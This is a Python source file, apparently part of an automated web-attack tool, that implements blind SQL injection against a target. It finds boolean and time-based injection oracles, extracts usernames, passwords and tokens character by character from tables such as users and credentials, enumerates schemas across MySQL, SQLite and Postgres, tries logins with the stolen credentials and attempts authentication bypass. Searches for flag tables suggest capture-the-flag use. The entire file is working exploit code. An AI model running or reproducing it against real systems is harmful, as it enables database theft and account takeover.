from __future__ import annotations

import time
from typing import Callable

from ravage.web_core.proof_recognizer import recognize_proofs

from .auth import _credential_pairs_from_rows, _usernames_from_rows
from .common import _dedupe, _prioritize
from .context import ExtractorContext
from .models import (
    AUTH_BYPASS_FOLLOWUP_BUDGET,
    MAX_BLIND_VALUE_CHARS,
    TIMING_CANDIDATE_DELAYS,
    TIMING_THRESHOLD_FACTOR,
    TIMING_WALL_CLOCK_SECONDS,
    ValueExpr,
    _BooleanPrimitive,
    _TimingPrimitive,
    _TimingProbeOutcome,
)
from .sql_helpers import (
    _BLIND_COLUMN_PRIORITY,
    _BLIND_TABLE_PRIORITY,
    _blind_columns_expr,
    _blind_tables_expr,
    _boolean_templates,
    _confirmed_boolean_templates,
    _mysql_expr,
    _postgres_expr,
    _responses_are_boolean_oracle,
    _responses_differ,
    _result_markers,
    _same_response_template_after_reflection,
    _similarity,
    _split_sql_items,
    _sqlite_expr,
    _strong_boolean_pair,
    _target_baseline_value,
    _timing_delta_matches,
    _timing_templates,
    _timing_value_candidates,
    _useful_data_value,
)


class BlindExtractionMixin(ExtractorContext):
    def _find_boolean_primitive(self, target: dict[str, object]) -> _BooleanPrimitive | None:
        input_name = str(target.get("input") or "")
        templates = _confirmed_boolean_templates(self.state, target) + list(
            _boolean_templates(_target_baseline_value(target, input_name, self.baseline_value))
        )
        for template in templates:
            true_payload = template.format(cond="1=1")
            false_payload = template.format(cond="1=0")
            true_response = self._send(target, true_payload, phase="boolean_probe", expr="1=1")
            false_response = self._send(target, false_payload, phase="boolean_probe", expr="1=0")
            if true_response is None or false_response is None:
                return None
            if _same_response_template_after_reflection(
                true_response.body,
                false_response.body,
                left_payload=true_payload,
                right_payload=false_payload,
            ):
                continue
            if not _responses_differ(true_response, false_response):
                continue
            true_confirm = self._send(target, template.format(cond="2=2"), phase="boolean_probe", expr="2=2")
            false_confirm = self._send(target, template.format(cond="2=1"), phase="boolean_probe", expr="2=1")
            if true_confirm is None or false_confirm is None:
                return None
            if _same_response_template_after_reflection(
                true_confirm.body,
                false_confirm.body,
                left_payload=template.format(cond="2=2"),
                right_payload=template.format(cond="2=1"),
            ):
                continue
            if _responses_are_boolean_oracle(true_response, false_response, true_confirm, false_confirm) or _strong_boolean_pair(
                true_response, false_response
            ):
                primitive = _BooleanPrimitive(
                    target=target,
                    template=template,
                    true_body=true_response.body,
                    false_body=false_response.body,
                    true_status=true_response.status,
                    false_status=false_response.status,
                )
                self.findings.append(
                    {
                        "type": "sql_boolean_primitive",
                        "phase": "boolean_probe",
                        "target": self.target_brief(target),
                        "true_payload": true_payload,
                        "false_payload": false_payload,
                    }
                )
                return primitive
        return None


    def _extract_boolean_blind(self, primitive: _BooleanPrimitive) -> None:
        self._extract_blind(
            eval_condition=lambda condition: self._bool_eval(primitive, condition),
            target=primitive.target,
            candidates=((_sqlite_expr, "sqlite"), (_mysql_expr, "mysql"), (_postgres_expr, "postgres")),
            summary_type="sql_boolean_extraction_summary",
            phase="boolean_extract",
            enumerate_schema=True,
        )


    def _extract_timing_blind(self, primitive: _TimingPrimitive) -> None:
        self._timing_deadline = time.monotonic() + TIMING_WALL_CLOCK_SECONDS
        self._timing_stop = False
        self._extract_blind(
            eval_condition=lambda condition: self._timing_eval(primitive, condition),
            target=primitive.target,
            candidates=_timing_value_candidates(primitive.dialect),
            summary_type="sql_timing_extraction_summary",
            phase="timing_extract",
            enumerate_schema=False,
        )


    def _extract_blind(
        self,
        *,
        eval_condition: Callable[[str], bool],
        target: dict[str, object],
        candidates: tuple[tuple[ValueExpr, str], ...],
        summary_type: str,
        phase: str,
        enumerate_schema: bool = False,
    ) -> None:
        extracted: list[dict[str, object]] = []
        credential_pairs: list[tuple[str, str]] = []
        extracted_usernames: list[str] = []
        auth_bypass_findings: list[dict[str, object]] = []
        for table in ("users", "admins", "user", "admin", "accounts", "credentials"):
            for row_index in range(3):
                username = self._first_blind_value(eval_condition, table, ("username", "user", "email", "name"), row_index, candidates)
                if username:
                    extracted.append({"table": table, "column": "username", "row": row_index, "value": username})
                    extracted_usernames.append(username)
                password = self._first_blind_value(eval_condition, table, ("password", "passwd", "pass", "secret", "token"), row_index, candidates)
                if password:
                    extracted.append({"table": table, "column": "password", "row": row_index, "value": password})
                if password:
                    for user in _dedupe([username, "admin", "administrator", "root", "user"]):
                        credential_pairs.append((user, password))
                self._register_blind_proof(username + password, target, phase)
                if self.proofs or self._timing_stop:
                    break
            if credential_pairs or self.proofs or self._timing_stop:
                break

        login_findings = self._try_logins(credential_pairs[:8]) if credential_pairs else []
        if not auth_bypass_findings and not login_findings and not self.proofs:
            auth_bypass_findings = self._try_sqli_auth_bypass(
                extracted_usernames,
                include_fallback=bool(extracted_usernames),
                max_requests=AUTH_BYPASS_FOLLOWUP_BUDGET,
            )

        if not self.proofs:
            for table in ("flag", "flags", "secret", "secrets"):
                for column in ("flag", "value", "secret", "token", "data", "content"):
                    value = self._extract_blind_value(eval_condition, table, column, 0, candidates)
                    if _useful_data_value(value):
                        extracted.append({"table": table, "column": column, "row": 0, "value": value})
                        self._register_blind_proof(value, target, phase)
                    if self.proofs or self._timing_stop:
                        break
                if self.proofs or self._timing_stop:
                    break

        if enumerate_schema and not self.proofs and not self._timing_stop and self.budget > 0:
            self._blind_schema_extraction(eval_condition, target, phase, extracted)

        if not credential_pairs:
            credential_pairs = _credential_pairs_from_rows(extracted)
        if not login_findings:
            login_findings = self._try_logins(credential_pairs[:8])
        if not auth_bypass_findings and not login_findings and not self.proofs:
            extracted_usernames = _dedupe([*extracted_usernames, *_usernames_from_rows(extracted)])
            auth_bypass_findings = self._try_sqli_auth_bypass(
                extracted_usernames,
                include_fallback=bool(extracted_usernames),
                max_requests=AUTH_BYPASS_FOLLOWUP_BUDGET,
            )
        if extracted or login_findings or auth_bypass_findings:
            self.findings.append(
                {
                    "type": summary_type,
                    "phase": phase,
                    "target": self.target_brief(target),
                    "extracted": extracted[:20],
                    "login_attempts": login_findings[:12],
                    "auth_bypass_attempts": auth_bypass_findings[:8],
                    "proofs": list(self.proofs),
                    "truncated": self._timing_stop,
                }
            )


    def _register_blind_proof(self, value: str, target: dict[str, object], phase: str) -> None:
        for proof in recognize_proofs(value):
            if proof not in self.proofs:
                self.proofs.append(proof)
                self.findings.append(
                    {
                        "type": "sql_extracted_proof",
                        "phase": phase,
                        "proof": proof,
                        "channel": "blind_extraction",
                        "target": self.target_brief(target),
                    }
                )


    def _blind_schema_extraction(
        self,
        eval_condition: Callable[[str], bool],
        target: dict[str, object],
        phase: str,
        extracted: list[dict[str, object]],
    ) -> None:
        """Enumerate real tables/columns via information_schema over the blind oracle."""
        for dialect in ("mysql", "sqlite", "postgres"):
            if self.budget <= 0 or self._timing_stop:
                return
            tables = _split_sql_items(self._blind_extract_raw(eval_condition, _blind_tables_expr(dialect), dialect))
            if not tables:
                continue
            self.findings.append(
                {
                    "type": "sql_schema_enumeration",
                    "phase": phase,
                    "dialect": dialect,
                    "tables": tables[:40],
                    "target": self.target_brief(target),
                }
            )
            if dialect == "sqlite":
                value_expr = _sqlite_expr
            elif dialect == "postgres":
                value_expr = _postgres_expr
            else:
                value_expr = _mysql_expr
            for table in _prioritize(tables, _BLIND_TABLE_PRIORITY)[:6]:
                if self.budget <= 0 or self._timing_stop:
                    return
                columns = _split_sql_items(
                    self._blind_extract_raw(eval_condition, _blind_columns_expr(dialect, table), dialect)
                )
                if not columns:
                    continue
                for column in _prioritize(columns, _BLIND_COLUMN_PRIORITY)[:4]:
                    for row_index in range(2):
                        if self.budget <= 0 or self._timing_stop:
                            return
                        value = self._blind_extract_raw(eval_condition, value_expr(table, column, row_index), dialect)
                        if _useful_data_value(value):
                            extracted.append(
                                {"table": table, "column": column, "row": row_index, "value": value, "source": "schema_enumeration"}
                            )
                            self._register_blind_proof(value, target, phase)
                            if self.proofs:
                                return
            return  # dialect resolved (tables found); do not retry the other dialect


    def _blind_extract_raw(self, eval_condition: Callable[[str], bool], expr: str, dialect: str) -> str:
        length = self._blind_length(eval_condition, expr)
        if length <= 0:
            return ""
        chars: list[str] = []
        for position in range(1, min(length, 255) + 1):
            if self.budget <= 0 or self._timing_stop:
                break
            code = self._blind_char_code(eval_condition, expr, position, dialect)
            if code <= 0:
                break
            chars.append(chr(code))
            if recognize_proofs("".join(chars)):
                break
        return "".join(chars)


    def _first_blind_value(
        self,
        eval_condition: Callable[[str], bool],
        table: str,
        columns: tuple[str, ...],
        row_index: int,
        candidates: tuple[tuple[ValueExpr, str], ...],
    ) -> str:
        for column in columns:
            value = self._extract_blind_value(eval_condition, table, column, row_index, candidates)
            if _useful_data_value(value):
                return value
            if self._timing_stop:
                break
        return ""


    def _extract_blind_value(
        self,
        eval_condition: Callable[[str], bool],
        table: str,
        column: str,
        row_index: int,
        candidates: tuple[tuple[ValueExpr, str], ...],
    ) -> str:
        for expr_builder, dialect in candidates:
            expr = expr_builder(table, column, row_index)
            length = self._blind_length(eval_condition, expr)
            if length <= 0:
                continue
            chars: list[str] = []
            expected_chars = min(length, MAX_BLIND_VALUE_CHARS)
            for position in range(1, expected_chars + 1):
                code = self._blind_char_code(eval_condition, expr, position, dialect)
                if code <= 0:
                    chars = []
                    break
                chars.append(chr(code))
                if recognize_proofs("".join(chars)):
                    break
            value = "".join(chars)
            if len(chars) < expected_chars and not recognize_proofs(value):
                continue
            if _useful_data_value(value):
                return value
            if self._timing_stop:
                break
        return ""


    def _blind_length(self, eval_condition: Callable[[str], bool], expr: str) -> int:
        if not eval_condition(f"length(({expr}))>0"):
            return 0
        low, high = 0, 96
        while low < high:
            if self.budget <= 0 or self._timing_stop:
                return 0
            mid = (low + high + 1) // 2
            if eval_condition(f"length(({expr}))>{mid}"):
                low = mid
            else:
                high = mid - 1
        return low + 1


    def _blind_char_code(self, eval_condition: Callable[[str], bool], expr: str, position: int, dialect: str) -> int:
        low, high = 31, 126
        func = "unicode(substr" if dialect == "sqlite" else "ascii(substring"
        while low < high:
            if self.budget <= 0 or self._timing_stop:
                return 0
            mid = (low + high + 1) // 2
            if eval_condition(f"{func}(({expr}),{position},1))>{mid}"):
                low = mid
            else:
                high = mid - 1
        if self.budget <= 0 or self._timing_stop:
            return 0
        code = low + 1
        return code if 32 <= code <= 126 else 0


    def _bool_eval(self, primitive: _BooleanPrimitive, condition: str) -> bool:
        payload = primitive.template.format(cond=condition)
        response = self._send(primitive.target, payload, phase="boolean_extract", expr=condition)
        if response is None:
            return False
        true_score = _similarity(response.status, response.body, primitive.true_status, primitive.true_body)
        false_score = _similarity(response.status, response.body, primitive.false_status, primitive.false_body)
        response_markers = set(_result_markers(response.body))
        true_markers = set(_result_markers(primitive.true_body))
        false_markers = set(_result_markers(primitive.false_body))
        if response_markers == true_markers and response_markers != false_markers:
            return True
        if response_markers == false_markers and response_markers != true_markers:
            return False
        return true_score > false_score + 0.03


    def _timing_eval(self, primitive: _TimingPrimitive, condition: str) -> bool:
        if self._timing_stop or time.monotonic() >= self._timing_deadline:
            self._timing_stop = True
            return False
        payload = primitive.template.format(cond=condition)
        response = self._send(primitive.target, payload, phase="timing_extract", expr=condition)
        if response is None:
            return False
        return (response.elapsed_ms - primitive.baseline_ms) >= primitive.threshold_ms


    def _find_timing_primitive(self, target: dict[str, object]) -> _TimingPrimitive | None:
        input_name = str(target.get("input") or "")
        base = _target_baseline_value(target, input_name, self.baseline_value)
        for delay in TIMING_CANDIDATE_DELAYS:
            for template, dialect in _timing_templates(base, delay):
                outcome = self._check_timing_template(
                    target=target,
                    template=template,
                    dialect=dialect,
                    delay=delay,
                )
                if outcome.abort:
                    return None
                if outcome.primitive is not None:
                    return outcome.primitive
        return None


    def _check_timing_template(
        self,
        *,
        target: dict[str, object],
        template: str,
        dialect: str,
        delay: float,
    ) -> _TimingProbeOutcome:
        delay_ms = delay * 1000
        false_response = self._send(target, template.format(cond="1=2"), phase="timing_probe", expr="1=2")
        if false_response is None:
            return _TimingProbeOutcome(abort=True)

        true_response = self._send(target, template.format(cond="1=1"), phase="timing_probe", expr="1=1")
        if true_response is None:
            return _TimingProbeOutcome(abort=True)
        if true_response.status is None:
            return _TimingProbeOutcome()

        if not _timing_delta_matches(false_response, true_response, delay_ms):
            return _TimingProbeOutcome()

        confirm = self._send(target, template.format(cond="1=1"), phase="timing_probe", expr="1=1 confirm")
        if confirm is None:
            return _TimingProbeOutcome(abort=True)
        if not _timing_delta_matches(false_response, confirm, delay_ms):
            return _TimingProbeOutcome()

        primitive = _TimingPrimitive(
            target=target,
            template=template,
            dialect=dialect,
            delay_seconds=delay,
            baseline_ms=false_response.elapsed_ms,
            threshold_ms=delay_ms * TIMING_THRESHOLD_FACTOR,
        )
        self._record_timing_primitive(primitive)
        return _TimingProbeOutcome(primitive=primitive)


    def _record_timing_primitive(self, primitive: _TimingPrimitive) -> None:
        replay_payload = primitive.template.format(cond="1=1")
        self.findings.append(
            {
                "type": "sql_timing_primitive",
                "phase": "timing_probe",
                "target": self.target_brief(primitive.target),
                "dialect": primitive.dialect,
                "delay_seconds": primitive.delay_seconds,
                "replay": self.replay_target(primitive.target, replay_payload),
            }
        )
